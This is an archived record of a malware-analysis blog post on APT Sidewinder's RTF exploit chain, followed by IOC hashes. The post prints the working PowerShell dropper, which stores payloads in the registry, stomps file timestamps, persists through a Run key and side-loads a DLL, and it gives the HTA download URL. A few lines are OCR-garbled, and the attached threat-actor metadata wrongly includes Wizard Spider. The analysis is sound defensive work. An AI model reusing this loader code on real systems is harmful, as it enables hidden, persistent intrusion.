{
    "id": "7ea44450-eba0-4472-b84e-3ac31f7e766e",
    "created_at": "2023-01-12T15:02:30.232539Z",
    "updated_at": "2025-03-27T02:15:10.967759Z",
    "deleted_at": null,
    "sha1_hash": "292a3ff01b063ada47a2268414eb3afcdd56dbc8",
    "title": "2018-07-16 - APT Sidewinder- Tricks powershell, Anti Forensics and execution side loading",
    "authors": "",
    "file_creation_date": "2022-05-28T05:09:55Z",
    "file_modification_date": "2022-05-28T05:09:55Z",
    "file_size": 625659,
    "plain_text": "# APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading\n\n**[medium.com/@Sebdraven/apt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c](https://medium.com/@Sebdraven/apt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c)**\n\nSebdraven July 17, 2018\n\n[Sebdraven](https://medium.com/?source=post_page-----5bc1a7e7c84c--------------------------------)\n\nJul 16, 2018\n\n\n7 min read\n\n## Spear phishing\n\nI’ve started few days ago an analysis on a RTF following my recent researches.\n\nI found it this: 892859ea9d86fc441b24222148db52eb33cd106c2ac68eafbe83ab0064215488\n\nI execute rtfobj on it and two ole embedded objects malforfed:\n\nBut rtfobj extracts succeffully two raws objects:\n\nThe object 6A2A1 is very interesting:\n\nand this one:\n\nIn fact, the ole object is a exploit of CVE-2017–11882.\n\nThe implementation is a bit different than my last article, there is not an object MTF.\n\n[The implementation has many matching with the public exploit: https://github.com/0x09AL/CVE-2017-11882-metasploit](https://github.com/0x09AL/CVE-2017-11882-metasploit)\n\nThe exploitation is the following:\n\nan hta is downloaded here and lauched by msthll.dll.RunHMLApplication.\n\ncaller.exe [hxxp://www.google.com.d-dns.co/includes/686a0ea5/-1/1223/da897db0/final.hta](http://www.google.com.d-dns.co/includes/686a0ea5/-1/1223/da897db0/final.hta)\n\n\n-----\n\ne ta s a o po e s e, bsc pt a d ja asc pt\n\n## Installation of payload and Persistance\n\nThe installation of the payload made by vscript a line 151\n\nobjWSS.RegWrite “HK”&”CU\\Softwa”&”re\\Updater\\pa”&”rt3\", bnm, “REG_SZ”\n\nhere\n\ntst = getProfile(“0”) & “$c=”””&c&”””;$m=”””&m&”””;”&\nBase64Decode(objWSS.RegRead(“HKEY_CURRENT_USER\\Softwa”&”re\\Updater\\pa”&”rt3\")) & getProfile(“1”)\n\nobjWSS.run “powershell.exe -ExecutionPolicy Bypass -Command “”” & tst & “”””, 0, true\n\nand here:\n\nobjWSS.RegWrite “HKCU\\Software\\Updater”, “”\n\nobjWSS.RegWrite “HKCU\\Software\\Updater\\part1”, p1, “REG_SZ”\n\nobjWSS.RegWrite “HKCU\\Software\\Updater\\part2”, p2, “REG_SZ”\n\nThe registry is used like pivot.\n\np1, p2 and bnm are three blobs of base64 data.\n\nbdm decoded is:\n\niex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(“””U2V0LUV4ZWN1dGlvblBvbGljeSAtRXhlY3V0aW9uUG9\n\nThere is a new base64 block decoded:\n\n\n-----\n\nSet ecut o o cy ecut o o cy ypass Scope Cu e tUse o ce;\n$ErrorActionPreference=’SilentlyContinue’;\n\n$pname36 = “3” + “60Tr” + “ay”\n$binDir = [Environment]::GetFolderPath([Enum]::ToObject([System.Environment+SpecialFolder], 35))+ “\\” + “Winset\\Config” + “\\”;\n$bin = “Winset.exe”;\ntry{\n$cmdLine = ([int]$c).toString(“00000000”)+([int]$m).toString(“00000000”);\n$cmdLine = $bin+ “ “ +$cmdLine;\n}\ncatch{\n$cmdLine = $bin;\n}\n$line = new-object byte[] 64;\n$buf6 =[Byte[]] (,0x23 * 64);\n$cbytes = [system.Text.Encoding]::ASCII.GetBytes($cmdLine);\n\n[array]::copy($cbytes,$line,$cbytes.length);\n\n$binPath = $binDir + $bin;\n$binPathdll = $binDir + “cmpbk32.dll”;\n$dmybinPath = $binDir + “cmdl32.exe”;\n$rpcdllpath = $binDir + “57146C96.dll”;\n$run = ‘HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\’;\n$system = ‘HKCU:Software\\Updater’;\n$runExists = False;\n$pnameavr = “av” + “gn” + “t”;\n$msvbvmdllpath = $env:WINDIR + “\\system32\\msvbvm60.dll”\n$cmdl32path = $env:WINDIR + “\\system32\\cmdl32.exe”\n\n$q36 = Get-Process $pname36 -ErrorAction SilentlyContinue;\nif($q36){\nexit\n}\n\nfunction dc($s){\nsal n New-Object;\n$data = [System.Convert]::FromBase64String(“H4sIAAAAAAA” + $s);\n$ms = n System.IO.MemoryStream;\n$ms.Write($data, 0, $data.Length);\n$ms.Seek(0,0) | Out-Null;\nreturn (n System.IO.StreamReader(n System.IO.Compression.GZipStream($ms,\n\n[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\n};\n\nfunction updt($t, $b){\n(ls $t).LastWriteTime = (ls $b).LastWriteTime\n(ls $t).CreationTime = (ls $b).CreationTime\n(ls $t).LastAccessTime = (ls $b).LastAccessTime\n}\n\nfunction wb64($path, $b64){\n$bytes = [System.Convert]::FromBase64String(“TVq” + $b64);\nNew-Item -ItemType Directory -Force -Path $binDir | Out-Null;\n\n[io.file]::WriteAllBytes($path,$bytes) | Out-Null;\nupdt -t $path -b $cmdl32path\n}\n\nfunction sb($h, $n ) {\n$len = $n.length;\n$limit = $h.length — $len;\nFor( $i = 0; $i -le $limit; $i++ ) {\n$k = 0;\nFor( ; $k -lt $len; $k++ ) {\nif( $n[$k] -ne $h[$i+$k] ) {break};\n}\nif( $k -eq $len ){return $i};\n\n\n-----\n\n}\nreturn -1;\n}\n\nif((Test-Path $env:WINDIR\\SysWOW64)){\n$msvbvmdllpath = $env:WINDIR + “\\SysWOW64\\msvbvm60.dll”\n$cmdl32path = $env:WINDIR + “\\SysWOW64\\cmdl32.exe”\n}\n\ntry{\nif(!(Test-Path $binPath)){\n\n$b64 = dc -s ((Get-ItemProperty -Path $system).part1);\n$bytes = [System.Convert]::FromBase64String(“TVq” + $b64);\n$rn = [System.BitConverter]::GetBytes((Get-Random -Maximum 9999 -Minimum 1111))[0..1];\n\n[array]::copy($rn,0,$bytes,$bytes.length — 2,2);\nNew-Item -ItemType Directory -Force -Path $binDir | Out-Null;\n\n[io.file]::WriteAllBytes($binPath,$bytes) | Out-Null;\nupdt -t $binPath -b $cmdl32path\n\n$b64dll = dc -s ((Get-ItemProperty -Path $system).part2);\n$bytes = [System.Convert]::FromBase64String(“TVq” + $b64dll);\n\n[array]::copy($line,0,$bytes,(sb -h $bytes -n $buf6),64);\nNew-Item -ItemType Directory -Force -Path $binDir | Out-Null;\n\n[io.file]::WriteAllBytes($binPathdll,$bytes) | Out-Null;\nupdt -t $binPathdll -b $cmdl32path\n}\n\nRemove-Item -Path $system | Out-Null;\nRemove-Item $PROFILE.CurrentUserAllHosts | Out-Null;\nNew-ItemProperty -Path $run -Name “Winsound” -PropertyType String -Value $dmybinPath | Out-Null;\n\nCopy-Item $msvbvmdllpath $rpcdllpath\nupdt -t $rpcdllpath -b $msvbvmdllpath\nCopy-Item $cmdl32path $dmybinPath\nupdt -t $dmybinPath -b $cmdl32path\n\n$avr = Get-Process $pnameavr -ErrorAction SilentlyContinue\nif (!$avr) {\n&($dmybinPath) | Out-Null;\n}\nExit\n}\ncatch {\n$_.Exception.Message | Out-Null;\n}\n\nThis powershell checks if the AV 360 is installed:\n\n$pname36 = “3” + “60Tr” + “ay”\n\n$q36 = Get-Process $pname36 -ErrorAction SilentlyContinue;\nif($q36){\nexit\n}\n\nWe can imagine the attackers were made a recon step before.\n\nThe folder where the loadin chain is:\n\n$binDir = [Environment]::GetFolderPath([Enum]::ToObject([System.Environment+SpecialFolder], 35))+ “\\” + “Winset\\Config” + “\\”;\n\nThe powershell copies:\n\n$msvbvmdllpath = $env:WINDIR + “\\system32\\msvbvm60.dll”\n$cmdl32path = $env:WINDIR + “\\system32\\cmdl32.exe”\n\nCopy-Item $cmdl32path $dmybinPath\n\n\n-----\n\nCopy te $ s b d pat $ pcd pat\n\nSo msvbvm60.dll becomes: 57146C96.dll\n\nAnd Winset.exe and cmpbk32.dll are decoded and copied in the same folder.\n\npart1 and part2 is the reg key base here $system = ‘HKCU:Software\\Updater’;:\n\nobjWSS.RegWrite “HKCU\\Software\\Updater”, “”\nobjWSS.RegWrite “HKCU\\Software\\Updater\\part1”, p1, “REG_SZ”\nobjWSS.RegWrite “HKCU\\Software\\Updater\\part2”, p2, “REG_SZ”\n\npart1 is big blob of base64 data.\n\nFirstly the registry key is retrieve:\n\n(Get-ItemProperty -Path $system).part1\n\nafter is the function dc is called.\n\nfunction dc($s){\nsal n New-Object;\n$data = [System.Convert]::FromBase64String(“H4sIAAAAAAA” + $s);\n$ms = n System.IO.MemoryStream;\n$ms.Write($data, 0, $data.Length);\n$ms.Seek(0,0) | Out-Null;\nreturn (n System.IO.StreamReader(n System.IO.Compression.GZipStream($ms,\n\n[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\n};\n\nthis string “H4sIAAAAAAA” is added at part2 and the data is decoded an\n\n$data = [System.Convert]::FromBase64String(“H4sIAAAAAAA” + $s);\n\nand unzip:\n\n[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\n};\n\nand the Mz header in base64 is added and decoded:\n\n$bytes = [System.Convert]::FromBase64String(“TVq” + $b64);\n\nand the executable is modified for the last time and copied in $binDir:\n\n$bytes = [System.Convert]::FromBase64String(“TVq” + $b64);\n$rn = [System.BitConverter]::GetBytes((Get-Random -Maximum 9999 -Minimum 1111))[0..1];\n\n[array]::copy($rn,0,$bytes,$bytes.length — 2,2);\nNew-Item -ItemType Directory -Force -Path $binDir | Out-Null;\n\n[io.file]::WriteAllBytes($binPath,$bytes) | Out-Null;\n\nThe dll is decoded, modified and written on disk in the same way:\n\n$b64dll = dc -s ((Get-ItemProperty -Path $system).part2);\n$bytes = [System.Convert]::FromBase64String(“TVq” + $b64dll);\n\n[array]::copy($line,0,$bytes,(sb -h $bytes -n $buf6),64);\nNew-Item -ItemType Directory -Force -Path $binDir | Out-Null;\n\n[io.file]::WriteAllBytes($binPathdll,$bytes) | Out-Null;\nupdt -t $binPathdll -b $cmdl32path\n\nThe Trick very important here is : [array]::copy($line,0,$bytes,(sb -h $bytes -n $buf6),64); to modify the dll.\n\nIf you decode the before the modification you have a dll truncated.\n\nbefore:\n\n\n-----\n\nafter:\n\nIn fact:\n\nThe powershell modify the dll to add $lines\n\nand $lines\n\n$line = new-object byte[] 64;\n\n$buf6 =[Byte[]] (,0x23 * 64);\n\n$cbytes = [system.Text.Encoding]::ASCII.GetBytes($cmdLine);\n\n[array]::copy($cbytes,$line,$cbytes.length);\n\nand $cmdLine\n\n$bin =Winset.exe\n\n$cmdLine = ([int]$c).toString(“00000000”)+([int]$m).toString(“00000000”);\n\n$cmdLine = $bin+ “ “ +$cmdLine;\n\n}\n\nlike in the dll: .string “Winset.exe -0000000100001223\n\nSo we have in the same folder: Winset\\Config\n\nWinset.exe (part1 modified and decoded)is a fake Windows Security Configuration Editor Command Tool\ncmpbk32.dll (part2 modified and decoded)\n57146C96.dll (vb virtual machine)\ncmdl32.exe (executable of windows)\n\nThe powershell change timestamps of files copied:\n\n\n-----\n\nupdt t $b at d b $c d 3 pat\n\nupdt -t $binPath -b $cmdl32path\n\nfunction updt($t, $b){\n(ls $t).LastWriteTime = (ls $b).LastWriteTime\n(ls $t).CreationTime = (ls $b).CreationTime\n(ls $t).LastAccessTime = (ls $b).LastAccessTime\n}\n\n## Persistance\n\nThe persistant is a hkey run very basic with the path of the dll in parameter:\n\n$run = ‘HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\’;\n\nNew-ItemProperty -Path $run -Name “Winsound” -PropertyType String -Value $dmybinPath | Out-Null;\n\nTo reload cmpbk32.dll at each reboot of the system and execute the dllmain of the dll.\n\n## Loading Chain\n\nThe powershell launch cmdl32.exe (“Connection Manager Phonebook Downloader”) trusted by AV because it’s develloped by Microsoft.\n\nthis exe used: cmpbk32.dll\n\nSo when cmdl32.exe is launched cmpbk32.dll is loaded. (in the same directory, side loading)\n\nthe entrypoint is exectuted.\n\nThe important part is:\n\n\n-----\n\nThe function sub.Winset.exe__0000000100001223_0 launches Winset.exe the real RAT like this “Winset.exe -0000000100001223” ; len=2\n\nWinset.exe is RAT developed in VB6.\n\n[You can find an complete analysis here: https://s.tencent.com/research/report/479.html](https://s.tencent.com/research/report/479.html)\n\n## Threat Intelligence\n\nWe have the TTPs described in Tencent with the same phases.\n\nSidewinder is a Indian Group targeting Pakistan military infrastructure.\n\nThe content of the RTF is cleary oriented to Navy Pakistani.\n\nIf we check the infrastructure of the attackers:\n\n\n-----\n\n[We have www.nadra.gov.pk.d-dns.co cleary targetted.](http://www.nadra.gov.pk.d-dns.co/)\n\nThe nadra is the National Database of and Registration Authority.\n\nIf you check the metada of RTF, Rashid Memorial is the author of the document.\n\nThis name is really known by the navy pakistani because “Rashid Memorial Welfare Organization (RMWO) was set up by a group of dedicated\nretired PAF officers in 1998 in memory of Flt. Lt. Rashid Ahmed Khan, who embraced ‘Shahadat’ on 13th December, 1997 when his aircraft\ncaught fire above a densely populated area.”\n\n## IOCs\n\nFile RTF:\n\n892859ea9d86fc441b24222148db52eb33cd106c2ac68eafbe83ab0064215488\n\n08b9b5b7592004b8733544df1029e2fc085d82db1ba488a43830df49bbbc73b6\n\nhta:\n\nb8cbdb36ccd666adaf2ba3628cc79578d3a05119c71dce1bb16aa39e56dea3cc\n\nExecutables:\n\n8315956b587032db14ba4e700400dffeaeb4119ef509ecf0df1bb4e80a496b59 (cmpbk32.dll)\n\n13497aab3521abbaa654b51f375114e419b1bb774caa8c67cf52775095b17423 (winset.exe)\n\nSandbox execution:\n\n## 892859ea9d86fc441b24222148db52eb33cd106c2ac68eafbe83ab0064215488.rtf (MD5…\n\n### Interactive malware hunting service. Any environments ready for live testing most type of threats. Without install…\n\n\n-----\n\napp a y u\n\n## Credits:\n\nThanks to Benjamin Piot for exchange about this cases !\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-07-16 - APT Sidewinder- Tricks powershell, Anti Forensics and execution side loading.pdf"
    ],
    "report_names": [
        "2018-07-16 - APT Sidewinder- Tricks powershell, Anti Forensics and execution side loading.pdf"
    ],
    "threat_actors": [
        {
            "id": "6b9fc913-06c6-4432-8c58-86a3ac614564",
            "created_at": "2022-10-25T16:07:24.185236Z",
            "updated_at": "2025-03-27T02:02:10.135195Z",
            "deleted_at": null,
            "main_name": "SideWinder",
            "aliases": [
                "APT-C-17",
                "APT-Q-39",
                "BabyElephant",
                "GroupA21",
                "HN2",
                "Hardcore Nationalist",
                "Rattlesnake",
                "Razor Tiger",
                "SideWinder",
                "T-APT-04"
            ],
            "source_name": "ETDA:SideWinder",
            "tools": [
                "BroStealer",
                "Capriccio RAT",
                "callCam"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "63061658-5810-4f01-9620-7eada7e9ae2e",
            "created_at": "2022-10-25T15:50:23.752974Z",
            "updated_at": "2025-03-27T02:00:55.538582Z",
            "deleted_at": null,
            "main_name": "Wizard Spider",
            "aliases": [
                "Wizard Spider",
                "UNC1878",
                "TEMP.MixMaster",
                "Grim Spider",
                "FIN12",
                "GOLD BLACKBURN",
                "ITG23",
                "Periwinkle Tempest",
                "DEV-0193"
            ],
            "source_name": "MITRE:Wizard Spider",
            "tools": [
                "TrickBot",
                "AdFind",
                "BITSAdmin",
                "Bazar",
                "LaZagne",
                "Nltest",
                "GrimAgent",
                "Dyre",
                "Ryuk",
                "Conti",
                "Emotet",
                "Rubeus",
                "Mimikatz",
                "Diavol",
                "PsExec",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f6f91e1c-9202-4497-bf22-9cd5ef477600",
            "created_at": "2023-01-06T13:46:38.86765Z",
            "updated_at": "2025-03-27T02:00:02.938998Z",
            "deleted_at": null,
            "main_name": "WIZARD SPIDER",
            "aliases": [
                "FIN12",
                "UNC2053",
                "Pistachio Tempest",
                "TEMP.MixMaster",
                "GOLD BLACKBURN",
                "Periwinkle Tempest",
                "DEV-0193",
                "Storm-0193",
                "Trickbot LLC",
                "DEV-0237"
            ],
            "source_name": "MISPGALAXY:WIZARD SPIDER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e6a21528-2999-4e2e-aaf4-8b6af14e17f3",
            "created_at": "2022-10-25T16:07:24.422115Z",
            "updated_at": "2025-03-27T02:02:10.216817Z",
            "deleted_at": null,
            "main_name": "Wizard Spider",
            "aliases": [
                "DEV-0193",
                "Gold Blackburn",
                "Gold Ulrick",
                "Grim Spider",
                "ITG23",
                "Operation BazaFlix",
                "Periwinkle Tempest",
                "TEMP.MixMaster",
                "Wizard Spider"
            ],
            "source_name": "ETDA:Wizard Spider",
            "tools": [
                "AdFind",
                "Agentemis",
                "Anchor_DNS",
                "BEERBOT",
                "BazarBackdoor",
                "BazarCall",
                "BazarLoader",
                "Cobalt Strike",
                "CobaltStrike",
                "Conti",
                "Diavol",
                "Dyranges",
                "Dyre",
                "Dyreza",
                "Dyzap",
                "Gophe",
                "Invoke-SMBAutoBrute",
                "KEGTAP",
                "LaZagne",
                "LightBot",
                "PowerSploit",
                "PowerTrick",
                "PsExec",
                "Ryuk",
                "SessionGopher",
                "TSPY_TRICKLOAD",
                "Team9Backdoor",
                "The Trick",
                "TheTrick",
                "Totbrick",
                "TrickBot",
                "TrickLoader",
                "TrickMo",
                "Upatre",
                "bazaloader",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "173f1641-36e3-4bce-9834-c5372468b4f7",
            "created_at": "2022-10-25T15:50:23.349637Z",
            "updated_at": "2025-03-27T02:00:55.450857Z",
            "deleted_at": null,
            "main_name": "Sidewinder",
            "aliases": [
                "Sidewinder",
                "T-APT-04"
            ],
            "source_name": "MITRE:Sidewinder",
            "tools": [
                "Koadic"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d0c0a5ea-3066-42a5-846c-b13527f64a3e",
            "created_at": "2023-01-06T13:46:39.080551Z",
            "updated_at": "2025-03-27T02:00:02.992026Z",
            "deleted_at": null,
            "main_name": "RAZOR TIGER",
            "aliases": [
                "SideWinder",
                "APT-C-17",
                "T-APT-04"
            ],
            "source_name": "MISPGALAXY:RAZOR TIGER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535750,
    "ts_updated_at": 1743041710,
    "ts_creation_date": 1653714595,
    "ts_modification_date": 1653714595,
    "files": {
        "pdf": "https://archive.orkl.eu/292a3ff01b063ada47a2268414eb3afcdd56dbc8.pdf",
        "text": "https://archive.orkl.eu/292a3ff01b063ada47a2268414eb3afcdd56dbc8.txt",
        "img": "https://archive.orkl.eu/292a3ff01b063ada47a2268414eb3afcdd56dbc8.jpg"
    }
}